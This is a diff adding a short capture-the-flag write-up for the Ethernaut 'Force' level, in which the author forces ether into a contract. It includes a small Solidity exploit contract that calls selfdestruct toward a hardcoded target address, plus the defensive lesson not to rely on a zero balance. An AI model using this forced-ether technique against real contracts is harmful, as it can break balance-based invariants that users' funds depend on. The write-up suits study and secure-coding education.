@@ -1,0 +1,39 @@
+Force
+Difficulty 5/10
+
+Some contracts will simply not take your money ¯\_(ツ)_/¯
+
+The goal of this level is to make the balance of the contract greater than zero.
+
+  Things that might help:
+
+Fallback methods
+Sometimes the best way to attack a contract is with another contract.
+See the Help page above, section "Beyond the console"
+
+220310 03:20 KST
+I think I just need to make a function that self destructs and make the eth go to the force contract.
+pretty simple
+
+
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+contract ForceETH {
+
+    function kill() external {
+        address payable target = payable(0x805b23559AA3B1b30bb34dF6c78e65B72B7C5e8F);
+        selfdestruct(target);
+    }
+
+    fallback() external payable {}
+    receive() external payable {}
+}
+
+I used this.
+
+
+
+In solidity, for a contract to be able to receive ether, the fallback function must be marked payable.
+
+However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.
